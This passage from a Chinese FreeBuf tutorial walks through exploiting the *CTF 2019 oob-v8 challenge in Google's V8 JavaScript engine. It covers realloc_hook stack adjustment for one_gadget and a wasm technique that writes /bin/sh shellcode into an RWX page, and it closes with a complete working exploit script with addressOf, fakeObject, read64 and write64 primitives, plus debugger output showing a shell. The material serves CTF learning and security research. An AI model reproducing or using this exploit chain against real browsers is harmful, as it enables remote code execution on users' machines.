+    .text:0000000000098C4B                 jnz     loc_98EE0  
+    ... ...  
+    .text:0000000000098EE0                 mov     rdx, [rsp+48h]  
+    .text:0000000000098EE5                 add     rsp, 18h  
+    .text:0000000000098EE9                 pop     rbx  
+    .text:0000000000098EEA                 pop     rbp  
+    .text:0000000000098EEB                 pop     r12  
+    .text:0000000000098EED                 pop     r13  
+    .text:0000000000098EEF                 pop     r14  
+    .text:0000000000098EF1                 pop     r15  
+    .text:0000000000098EF3                 jmp     rax
+
+只要保证realloc_hook不为空，realloc函数最终会去调用realloc_hook。仔细观察上述这段指令，可以发现它具有调整栈空间偏移的作用。
+
+如果我们从realloc起始地址运行调用reall_hook的话，经过push
+pop后，栈空间最终肯定还是平衡的。但如果我们不从函数起始地址98C30开始执行，而是从后面的比如98C39地址开始执行，程序就少push了5个寄存器，最终在触发realloc_hook时就会导致栈空间多pop了5个寄存器，也就导致栈空间向高地址偏移了0x40个字节。
+
+利用上述栈空间调节技巧，我们可以在malloc_hook处写上realloc函数98C39的地址，然后在realloc_hook处填写上one_gadget的地址，这样我们就可以动态调整栈空间布局了。很有可能在触发one_gadget时就满足了栈空间要求。
+
+需要注意的是，同时写入malloc_hook和realloc_hook时，如果连续两次使用write64_dataview会导致v8程序崩溃。这是因为本质上仍旧需要调用write64原语，FloatArray在第一次write64时已经被篡改了，第二次再调用时，v8就会检测其合法性，从而导致触发异常而失败。
+
+我们可以在第一次write64时，利用DataView的特性结合realloc_hook和malloc_hook在内存中是连续的这一特点，同时改写两者的内存，实际js实现代码如下所示：
+
+    
+    
+    var data_buf = new ArrayBuffer(16);  
+    var data_view = new DataView(data_buf);  
+    var buf_backing_store_addr = addressOf(data_buf) + 0x20n;  
+    ​  
+    function write64_dataview_double(addr, data1, data2)  
+    {  
+        write64(buf_backing_store_addr, addr);  
+        data_view.setFloat64(0, i2f(data1), true);  
+        data_view.setFloat64(8, i2f(data2), true);  
+    }  
+    write64_dataview_doublelibc_realloc_hook, data_to_realloc_hook, data_to_mallo_hook);
+
+这样后续就可以连续触发malloc_hook和realloc_hook了。
+
+当然如果这样调整栈空间后，调用one_gadget时的栈空间布局还不满足要求的话，就可以尝试在触发漏洞之前先调用一些无用的js代码，动态改变执行one_gadget时的栈空间布局，后续执行one_gadget时或许就能满足栈空间要求了，有兴趣的童鞋可以做一下测试。
+
+## 0x07 浏览器shellcode新姿势：wasm
+
+wasm即webassembly，可能很多童鞋对它都很陌生，我基本上也是第一次接触。不过刚开始学习浏览器的话，先简单了解一下基础用法就可以。
+
+简单来说，wasm就是可以让JavaScript直接执行高级语言生成的机器码的一种技术。
+
+### 1\. Wasm简单用法
+
+有高人已经做出来一个WasmFiddle网站，可以在线将C语言直接转换为wasm并生成JS配套调用代码。首先我们来试用一下在线编译，感受感受wasm的魅力。
+
+首先进入网站<https://wasdk.github.io/WasmFiddle/>，可以看到左侧是c语言代码，右侧是JS调用代码，左下角可以选择c语言要转换成的wasm格式，包括Text格式、Code
+Buffer等，右下角可以看到js调用wasm的最终调用效果。
+
+左下角选择Code
+Buffer，然后点击最上方的Build按钮，就可以看到左下角生成了我们需要的wasm代码。点击Run，右下角就可以看到js调用输出了C语言返回的数字42。  
+![wasmfiddle.png](https://image.3001.net/images/20190515/1557932392_5cdc2968d850e.png!small)
+
+我们直接将CodeBuffer中生成的wasm和右上角的js交互代码拷贝到本地的test.js，进行测试：  
+
+    
+    
+    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);  
+    ​  
+    var wasmModule = new WebAssembly.Module(wasmCode);  
+    var wasmInstance = new WebAssembly.Instance(wasmModule, {});  
+    var f = wasmInstance.exports.main;  
+    ​  
+    var d = f();  
+    console.log("[*] return from wasm: " + d);  
+    %SystemBreak();
+
+gdb中调试v8可以得到如下输出：
+
+    
+    
+    pwndbg> r  
+    [*] return from wasm: 42
+
+经过上述过程可以发现，我们编写的C语言代码直接在js中运行了。那有没有一种可能就是，直接在wasm中写入我们的shellcode，然后浏览器调用执行，是不是不需要漏洞就能执行我们的shellcode了？
+
+呵呵，当然是不行的，否则浏览器还不得被黑产搞死。简单举个例子，假设我们在WasmFiddle中编写C语言中需要调用系统库的最简单的hello
+world函数：
+
+    
+    
+    #include <stdio.h>  
+    int func() {   
+      printf("hello wasm");  
+    }
+
+编译后在线运行，可以发现js抛出以下异常：
+
+    
+    
+    line 2: Uncaught TypeError: WebAssembly.Instance(): Import #0 module="env" error: module is not an object or function
+
+简单来说就是，wasm从安全性考虑也不可能允许通过浏览器直接调用系统函数。wasm中只能运行数学计算、图像处理等系统无关的高级语言代码。
+
+### 2\. 如何在wasm中运行shellcode
+
+虽然我们无法直接生成wasm的shellcode，但我们可以结合漏洞将原本内存中的的wasm代码替换为shellcode，当后续调用wasm的接口时，实际上调用的就是我们的shellcode了。
+
+那么我们利用wasm执行shellcode的思路已经基本清晰：
+
+> 首先加载一段wasm代码到内存中
+>
+> 然后通过addresssOf原语找到存放wasm的内存地址
+>
+> 接着通过任意地址写原语用shellcode替换原本wasm的代码内容
+>
+> 最后调用wasm的函数接口即可触发调用shellcode
+
+如何找到v8存放wasm代码的内存页地址呢？我们编写下面的js代码调试一下：
+
+    
+    
+    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);  
+    ​  
+    var wasmModule = new WebAssembly.Module(wasmCode);  
+    var wasmInstance = new WebAssembly.Instance(wasmModule, {});  
+    var f = wasmInstance.exports.main;  
+    ​  
+    var f_addr = addressOf(f);  
+    console.log("[*] leak wasm func addr: 0x" + hex(f_addr));  
+    %SystemBreak();
+
+执行得到wasm函数的接口地址：
+
+    
+    
+    pwndbg> r  
+    [*] leak wasm func addr: 0x000029c78a5e2068
+
+利用job命令查看函数结构对象，经过Function-->shared_info-->WasmExportedFunctionData-->instance等一系列调用关系，在instance+0x88的固定偏移处，就能读取到存储wasm代码的内存页起始地址，如下所示：
+
+    
+    
+    pwndbg> job 0x000029c78a5e2069 <-- Function接口对象  
+    0x29c78a5e2069: [Function] in OldSpace  
+     - map: 0x21ba60f84379 <Map(HOLEY_ELEMENTS)> [FastProperties]  
+     - prototype: 0x29c78a5c2109 <JSFunction (sfi = 0x375c767c3b29)>  
+     - elements: 0x099635fc0c71 <FixedArray[0]> [HOLEY_ELEMENTS]  
+     - function prototype: <no-prototype-slot>  
+     - shared_info: 0x29c78a5e2031 <SharedFunctionInfo 0> <--找到shared_info  
+     - name: 0x099635fc4ae1 <String[#1]: 0>  
+     - formal_parameter_count: 0  
+     - kind: NormalFunction  
+     - context: 0x29c78a5c1869 <NativeContext[246]>  
+     - code: 0x1fda7e782001 <Code JS_TO_WASM_FUNCTION>  
+     - WASM instance 0x29c78a5e1e71  
+     - WASM function index 0  
+     - properties: 0x099635fc0c71 <FixedArray[0]> {  
+        #length: 0x375c767c04b9 <AccessorInfo> (const accessor descriptor)  
+        #name: 0x375c767c0449 <AccessorInfo> (const accessor descriptor)  
+        #arguments: 0x375c767c0369 <AccessorInfo> (const accessor descriptor)  
+        #caller: 0x375c767c03d9 <AccessorInfo> (const accessor descriptor)  
+     }  
+    ​  
+     - feedback vector: not available  
+    pwndbg> job 0x29c78a5e2031 <--查看shared_info  
+    0x29c78a5e2031: [SharedFunctionInfo] in OldSpace  
+     - map: 0x099635fc09e1 <Map[56]>  
+     - name: 0x099635fc4ae1 <String[#1]: 0>  
+     - kind: NormalFunction  
+     - function_map_index: 144  
+     - formal_parameter_count: 0  
+     - expected_nof_properties: 0  
+     - language_mode: sloppy  
+     - data: 0x29c78a5e2009 <WasmExportedFunctionData> <-- 找到WasmExportedFunctionData  
+     - code (from data): 0x1fda7e782001 <Code JS_TO_WASM_FUNCTION>  
+     - function token position: -1  
+     - start position: -1  
+     - end position: -1  
+     - no debug info  
+     - scope info: 0x099635fc0c61 <ScopeInfo[0]>  
+     - length: 0  
+     - feedback_metadata: 0x99635fc2a39: [FeedbackMetadata]  
+     - map: 0x099635fc1319 <Map>  
+     - slot_count: 0  
+    ​  
+    pwndbg> job 0x29c78a5e2009 <-- WasmExportedFunctionData  
+    0x29c78a5e2009: [WasmExportedFunctionData] in OldSpace  
+     - map: 0x099635fc5879 <Map[40]>  
+     - wrapper_code: 0x1fda7e782001 <Code JS_TO_WASM_FUNCTION>  
+     - instance: 0x29c78a5e1e71 <Instance map = 0x21ba60f89789> <-- 找到instance  
+     - function_index: 0  
+    pwndbg> telescope 0x29c78a5e1e70+0x88 <-- instance+0x88的位置存储的即为RWX内存页起始地址  
+    00:0000│   0x29c78a5e1ef8 —▸ 0x2257a726c000 ◂— movabs r10, 0x2257a726c260 /* 0x2257a726c260ba49 */  
+    01:0008│   0x29c78a5e1f00 —▸ 0xfaa2fd10971 ◂— 0x71000021ba60f891  
+    pwndbg> vmmap 0x2257a726c000  
+    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
+        0x2257a726c000     0x2257a726d000 rwxp     1000 0      
+
+根据上述寻找思路，结合addressOf和read64原语，写出泄露RWX内存页起始地址的JS代码如下所示：
+
+    
+    
+    var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;  
+    var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;  
+    var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;  
+    var rwx_page_addr = read64(wasm_instance_addr + 0x88n);  
+    ​  
+    console.log("[*] leak rwx_page_addr: 0x" + hex(rwx_page_addr));
+
+gdb调试结果如下：
+
+    
+    
+    pwndbg> r  
+    Starting program: browser/x64.release/d8 --allow-natives-syntax ./test.js  
+    [*] leak wasm func addr: 0x00000c268c4223f8  
+    [*] leak from: 0x00000c268c422410: 0x00000c268c4223c1  
+    [*] leak from: 0x00000c268c4223c8: 0x00000c268c422399  
+    [*] leak from: 0x00000c268c4223a8: 0x00000c268c422201  
+    [*] leak from: 0x00000c268c422288: 0x00001194dbc9a000  
+    [*] leak rwx_page_addr: 0x00001194dbc9a000
+
+可以发现成功泄露了rwx内存页的起始地址，
+
+后续只要利用任意地址写write64原语我们的shellcode写入这个rwx页，然后调用wasm函数接口即可触发我们的shellcode了，具体实现如下所示：
+
+    
+    
+    /* /bin/sh for linux x64  
+     char shellcode[] = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f \x2f\x62\x69\x6e\x2f\x73\x68\x53 \x54\x5f\x52\x57\x54\x5e\x0f\x05";  
+    */  
+    var shellcode = [  
+        0x2fbb485299583b6an,  
+        0x5368732f6e69622fn,  
+        0x050f5e5457525f54n  
+    ];  
+    ​  
+    var data_buf = new ArrayBuffer(24);  
+    var data_view = new DataView(data_buf);  
+    var buf_backing_store_addr = addressOf(data_buf) + 0x20n;  
+    ​  
+    write64(buf_backing_store_addr, rwx_page_addr);  //这里写入之前泄露的rwx_page_addr地址  
+    data_view.setFloat64(0, i2f(shellcode[0]), true);  
+    data_view.setFloat64(8, i2f(shellcode[1]), true);  
+    data_view.setFloat64(16, i2f(shellcode[2]), true);  
+    ​  
+    f();
+
+最终运行结果如下：
+
+    
+    
+    ./d8 test.js   
+    [*] leak wasm func addr: 0x000035475ed224a0  
+    [*] leak from: 0x000035475ed224b8: 0x000035475ed22469  
+    [*] leak from: 0x000035475ed22470: 0x000035475ed22441  
+    [*] leak from: 0x000035475ed22450: 0x000035475ed222a9  
+    [*] leak from: 0x000035475ed22330: 0x0000385d0236c000  
+    [*] leak rwx_page_addr: 0x0000385d0236c000  
+    [*] write to : 0x00000342671d1bc0: 0x0000385d0236c000  
+    $ uname -a  
+    Linux 4.18.0-18-generic #19~18.04.1-Ubuntu SMP Fri Apr 5 10:22:13 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux  
+    $ 
+
+最后给出一个完整的exp脚本：
+
+    
+    
+    // ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××  
+    ​  
+    var buf =new ArrayBuffer(16);  
+    var float64 = new Float64Array(buf);  
+    var bigUint64 = new BigUint64Array(buf);  
+    ​  
+    // 浮点数转换为64位无符号整数  
+    function f2i(f)  
+    {  
+        float64[0] = f;  
+        return bigUint64[0];  
+    }  
+    // 64位无符号整数转为浮点数  
+    function i2f(i)  
+    {  
+        bigUint64[0] = i;  
+        return float64[0];  
+    }  
+    // 64位无符号整数转为16进制字节串  
+    function hex(i)  
+    {  
+        return i.toString(16).padStart(16, "0");  
+    }  
+    ​  
+    // ××××××××2. addressOf和fakeObject的实现××××××××  
+    var obj = {"a": 1};  
+    var obj_array = [obj];  
+    var float_array = [1.1];  
+    ​  
+    var obj_array_map = obj_array.oob();  
+    var float_array_map = float_array.oob();  
+    ​  
+    // 泄露某个object的地址  
+    function addressOf(obj_to_leak)  
+    {  
+        obj_array[0] = obj_to_leak;  
+        obj_array.oob(float_array_map);  
+        let obj_addr = f2i(obj_array[0]) - 1n;  
+        obj_array.oob(obj_array_map); // 还原array类型，以便后续继续使用  
+        return obj_addr;  
+    }  
+    ​  
+    // 将某个addr强制转换为object对象  
+    function fakeObject(addr_to_fake)  
+    {  
+        float_array[0] = i2f(addr_to_fake + 1n);  
+        float_array.oob(obj_array_map);  
+        let faked_obj = float_array[0];  
+        float_array.oob(float_array_map); // 还原array类型，以便后续继续使用  
+        return faked_obj;  
+    }  
+    ​  
+    ​  
+    var fake_array = [  
+        float_array_map,  
+        i2f(0n),  
+        i2f(0x41414141n),  
+        i2f(0x1000000000n),  
+        1.1,  
+        2.2,  
+    ];  
+    ​  
+    var fake_array_addr = addressOf(fake_array);  
+    var fake_object_addr = fake_array_addr - 0x40n + 0x10n;  
+    var fake_object = fakeObject(fake_object_addr);  
+    ​  
+    function read64(addr)  
+    {  
+        fake_array[2] = i2f(addr - 0x10n + 0x1n);  
+        let leak_data = f2i(fake_object[0]);  
+        console.log("[*] leak from: 0x" +hex(addr) + ": 0x" + hex(leak_data));  
+        return leak_data;  
+    }  
+    ​  
+    function write64(addr, data)  
+    {  
+        fake_array[2] = i2f(addr - 0x10n + 0x1n);  
+        fake_object[0] = i2f(data);  
+        console.log("[*] write to : 0x" +hex(addr) + ": 0x" + hex(data));      
+    }  
+    ​  
+    var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);  
+    ​  
+    var wasmModule = new WebAssembly.Module(wasmCode);  
+    var wasmInstance = new WebAssembly.Instance(wasmModule, {});  
+    var f = wasmInstance.exports.main;  
+    ​  
+    var f_addr = addressOf(f);  
+    console.log("[*] leak wasm func addr: 0x" + hex(f_addr));  
+    ​  
+    var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;  
+    var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;  
+    var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;  
+    var rwx_page_addr = read64(wasm_instance_addr + 0x88n);  
+    ​  
+    console.log("[*] leak rwx_page_addr: 0x" + hex(rwx_page_addr));  
+    ​  
+    var shellcode = [  
+        0x2fbb485299583b6an,  
+        0x5368732f6e69622fn,  
+        0x050f5e5457525f54n  
+    ];  
+    ​  
+    var data_buf = new ArrayBuffer(24);  
+    var data_view = new DataView(data_buf);  
+    var buf_backing_store_addr = addressOf(data_buf) + 0x20n;  
+    ​  
+    write64(buf_backing_store_addr, rwx_page_addr);  
+    data_view.setFloat64(0, i2f(shellcode[0]), true);  
+    data_view.setFloat64(8, i2f(shellcode[1]), true);  
+    data_view.setFloat64(16, i2f(shellcode[2]), true);  
+    ​  
+    ​  
+    f();
+
+## 0x08 总结
+
+总结了两天才把思路捋顺了，这是自己第一次系统性地学习浏览器漏洞利用。从整个利用过程来看，一个浏览器漏洞的完整利用基本上需要经过以下3个步骤：
+
+> 首先借助漏洞将越界读写、类型混淆等漏洞实现addressOf和fakeObject原语
+>
+> 然后通过addressOf和fakeObject原语实现任意地址读写原语read64和write64
+>
+> 最后利用传统堆利用或wasm写入并触发shellcode
+
+当然最难的部分就是怎么借助于漏洞实现addressOf和fakeObject原语，这也是后续需要多学习积累的部分。文中难免有理解错误的地方，敬请斧正。
+
+## 0x09 参考
+
+[0] Ne0 master github <https://github.com/Changochen>
+
+[1] *CTF 2019 oob-v8
+<https://changochen.github.io/2019-04-29-starctf-2019.html>
+
+[2] Exploiting the Math.expm1 typing bug in V8
+<https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/#code-execution>
+
+[3] Exploiting Chrome V8: Krautflare (35C3 CTF 2018)
+<https://www.jaybosamiya.com/blog/2019/01/02/krautflare/#a-new-hope>
+
+[4] WasmFiddle <https://wasdk.github.io/WasmFiddle/>
+
+[5] pwn.js
+<https://github.com/alstjr4192/BGazuaaaaa/blob/master/*CTF%202019%20oob/pwn.js>
+
+[6] startctf2019-oob <https://github.com/sixstars/starctf2019/tree/master/pwn-OOB>
+
+***本文原创作者：walkerfuz，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
